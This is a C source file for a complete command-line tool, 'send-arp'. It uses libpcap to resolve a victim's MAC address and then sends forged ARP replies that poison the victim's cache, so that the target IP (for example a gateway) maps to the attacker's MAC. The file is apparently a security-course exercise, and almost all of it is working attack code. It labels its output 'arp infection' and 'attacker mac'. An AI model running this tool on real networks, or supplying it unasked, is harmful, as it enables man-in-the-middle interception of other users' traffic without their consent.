#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

enum {
	ETH_TYPE_IP4 = 0x0800,
	ETH_TYPE_ARP = 0x0806,

	ARP_HRD_ETHER = 0x0001,
	ARP_OP_REQUEST = 0x0001,
	ARP_OP_REPLY = 0x0002,
};

#pragma pack(push, 1)
typedef struct {
	uint8_t dmac[6];
	uint8_t smac[6];
	uint16_t type;
} EthHdr;

typedef struct {
	uint16_t hrd;
	uint16_t pro;
	uint8_t hln;
	uint8_t pln;
	uint16_t op;
	uint8_t smac[6];
	uint32_t sip;
	uint8_t tmac[6];
	uint32_t tip;
} ArpHdr;

typedef struct {
	EthHdr eth;
	ArpHdr arp;
} EthArpPacket;
#pragma pack(pop)

typedef struct {
	uint32_t sender_ip;
	uint32_t target_ip;
} Flow;

static void usage(void) {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

static const char* mac_to_string(const uint8_t mac[6], char* buf, size_t buflen) {
	if (buflen < 18) return "";
	snprintf(buf, buflen, "%02X:%02X:%02X:%02X:%02X:%02X",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return buf;
}

static const char* ip_to_string(uint32_t ip_host_order, char* buf, size_t buflen) {
	struct in_addr in;
	in.s_addr = htonl(ip_host_order);
	return inet_ntop(AF_INET, &in, buf, buflen) ? buf : "";
}

static int parse_ipv4(const char* s, uint32_t* out_ip_host_order) {
	struct in_addr in;
	if (inet_pton(AF_INET, s, &in) != 1) return 0;
	*out_ip_host_order = ntohl(in.s_addr);
	return 1;
}

static int parse_args(int argc, char* argv[], const char** dev, Flow** out_flows, size_t* out_flow_count) {
	if (argc < 4 || ((argc - 2) % 2) != 0) {
		usage();
		return 0;
	}

	*dev = argv[1];
	size_t flow_count = (size_t)(argc - 2) / 2;
	Flow* flows = (Flow*)calloc(flow_count, sizeof(Flow));
	if (flows == NULL) {
		perror("calloc");
		return 0;
	}

	for (size_t i = 0; i < flow_count; i++) {
		const char* sender_ip_str = argv[2 + i * 2];
		const char* target_ip_str = argv[2 + i * 2 + 1];
		if (!parse_ipv4(sender_ip_str, &flows[i].sender_ip) ||
			!parse_ipv4(target_ip_str, &flows[i].target_ip)) {
			fprintf(stderr, "invalid ip pair: %s %s\n", sender_ip_str, target_ip_str);
			free(flows);
			return 0;
		}
	}

	*out_flows = flows;
	*out_flow_count = flow_count;
	return 1;
}

static int get_iface_mac(const char* dev, uint8_t mac[6]) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket(AF_INET, SOCK_DGRAM)");
		return 0;
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl(SIOCGIFHWADDR)");
		close(fd);
		return 0;
	}

	memcpy(mac, (uint8_t*)ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
	return 1;
}

static int get_iface_ip(const char* dev, uint32_t* out_ip_host_order) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket(AF_INET, SOCK_DGRAM)");
		return 0;
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
	ifr.ifr_addr.sa_family = AF_INET;

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl(SIOCGIFADDR)");
		close(fd);
		return 0;
	}

	struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
	*out_ip_host_order = ntohl(sin->sin_addr.s_addr);
	close(fd);
	return 1;
}

static int pcap_send(pcap_t* pcap, const void* packet, size_t packet_len) {
	if (packet_len > (size_t)INT32_MAX) {
		fprintf(stderr, "packet too large\n");
		return 0;
	}
	int res = pcap_sendpacket(pcap, (const u_char*)packet, (int)packet_len);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return 0;
	}
	return 1;
}

static void build_arp_request(EthArpPacket* packet, const uint8_t my_mac[6], uint32_t my_ip, uint32_t target_ip) {
	static const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	static const uint8_t null_mac[6] = {0, 0, 0, 0, 0, 0};

	memcpy(packet->eth.dmac, broadcast_mac, 6);
	memcpy(packet->eth.smac, my_mac, 6);
	packet->eth.type = htons(ETH_TYPE_ARP);

	packet->arp.hrd = htons(ARP_HRD_ETHER);
	packet->arp.pro = htons(ETH_TYPE_IP4);
	packet->arp.hln = 6;
	packet->arp.pln = 4;
	packet->arp.op = htons(ARP_OP_REQUEST);
	memcpy(packet->arp.smac, my_mac, 6);
	packet->arp.sip = htonl(my_ip);
	memcpy(packet->arp.tmac, null_mac, 6);
	packet->arp.tip = htonl(target_ip);
}

static void build_arp_reply(EthArpPacket* packet,
	const uint8_t my_mac[6],
	const uint8_t sender_mac[6],
	uint32_t sender_ip,
	uint32_t target_ip) {
	memcpy(packet->eth.dmac, sender_mac, 6);
	memcpy(packet->eth.smac, my_mac, 6);
	packet->eth.type = htons(ETH_TYPE_ARP);

	packet->arp.hrd = htons(ARP_HRD_ETHER);
	packet->arp.pro = htons(ETH_TYPE_IP4);
	packet->arp.hln = 6;
	packet->arp.pln = 4;
	packet->arp.op = htons(ARP_OP_REPLY);
	memcpy(packet->arp.smac, my_mac, 6);
	packet->arp.sip = htonl(target_ip);
	memcpy(packet->arp.tmac, sender_mac, 6);
	packet->arp.tip = htonl(sender_ip);
}

static int64_t now_ms(void) {
	struct timespec ts;
	if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
	return (int64_t)ts.tv_sec * 1000 + (int64_t)ts.tv_nsec / 1000000;
}

static int wait_arp_reply(pcap_t* pcap,
	uint32_t sender_ip,
	uint32_t my_ip,
	const uint8_t my_mac[6],
	uint8_t out_sender_mac[6],
	int timeout_ms) {
	const int64_t deadline = now_ms() + timeout_ms;
	while (now_ms() < deadline) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(pcap));
			return 0;
		}

		if (header->caplen < sizeof(EthArpPacket)) continue;
		const EthArpPacket* eth_arp = (const EthArpPacket*)packet;

		if (ntohs(eth_arp->eth.type) != ETH_TYPE_ARP) continue;
		if (ntohs(eth_arp->arp.op) != ARP_OP_REPLY) continue;

		if (ntohl(eth_arp->arp.sip) != sender_ip) continue;
		if (ntohl(eth_arp->arp.tip) != my_ip) continue;
		if (memcmp(eth_arp->eth.dmac, my_mac, 6) != 0) continue;

		memcpy(out_sender_mac, eth_arp->arp.smac, 6);
		return 1;
	}
	return 0;
}

static int resolve_sender_mac(pcap_t* pcap,
	const uint8_t my_mac[6],
	uint32_t my_ip,
	uint32_t sender_ip,
	uint8_t out_sender_mac[6]) {
	for (int i = 0; i < 3; i++) {
		EthArpPacket req;
		build_arp_request(&req, my_mac, my_ip, sender_ip);
		if (!pcap_send(pcap, &req, sizeof(req))) return 0;

		if (wait_arp_reply(pcap, sender_ip, my_ip, my_mac, out_sender_mac, 2000)) return 1;
	}
	return 0;
}

static int send_arp_infection(pcap_t* pcap,
	const uint8_t my_mac[6],
	const uint8_t sender_mac[6],
	uint32_t sender_ip,
	uint32_t target_ip) {
	EthArpPacket reply;
	build_arp_reply(&reply, my_mac, sender_mac, sender_ip, target_ip);
	return pcap_send(pcap, &reply, sizeof(reply));
}

int main(int argc, char* argv[]) {
	const char* dev;
	Flow* flows;
	size_t flow_count;
	if (!parse_args(argc, argv, &dev, &flows, &flow_count)) return EXIT_FAILURE;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) failed: %s\n", dev, errbuf);
		free(flows);
		return EXIT_FAILURE;
	}

	uint8_t my_mac[6];
	uint32_t my_ip;
	if (!get_iface_mac(dev, my_mac)) {
		fprintf(stderr, "failed to get attacker mac from interface %s\n", dev);
		pcap_close(pcap);
		free(flows);
		return EXIT_FAILURE;
	}
	if (!get_iface_ip(dev, &my_ip)) {
		fprintf(stderr, "failed to get attacker ip from interface %s\n", dev);
		pcap_close(pcap);
		free(flows);
		return EXIT_FAILURE;
	}

	char mac_buf[32];
	char ip_buf[64];
	printf("[*] attacker mac: %s\n", mac_to_string(my_mac, mac_buf, sizeof(mac_buf)));
	printf("[*] attacker ip : %s\n", ip_to_string(my_ip, ip_buf, sizeof(ip_buf)));

	for (size_t i = 0; i < flow_count; i++) {
		char sender_ip_buf[64];
		char target_ip_buf[64];

		printf("[*] sender ip: %s\n", ip_to_string(flows[i].sender_ip, sender_ip_buf, sizeof(sender_ip_buf)));
		printf("[*] target ip: %s\n", ip_to_string(flows[i].target_ip, target_ip_buf, sizeof(target_ip_buf)));

		uint8_t sender_mac[6];
		printf("[*] resolving sender mac...\n");
		if (!resolve_sender_mac(pcap, my_mac, my_ip, flows[i].sender_ip, sender_mac)) {
			fprintf(stderr, "failed to resolve sender mac for %s\n", sender_ip_buf);
			continue;
		}
		printf("[*] sender mac: %s\n", mac_to_string(sender_mac, mac_buf, sizeof(mac_buf)));

		printf("[*] sending arp infection: %s is-at %s -> to %s\n",
			target_ip_buf,
			mac_to_string(my_mac, mac_buf, sizeof(mac_buf)),
			sender_ip_buf);

		for (int j = 0; j < 3; j++) {
			if (!send_arp_infection(pcap, my_mac, sender_mac, flows[i].sender_ip, flows[i].target_ip)) break;
			usleep(100 * 1000);
		}
	}

	pcap_close(pcap);
	free(flows);
	return EXIT_SUCCESS;
}
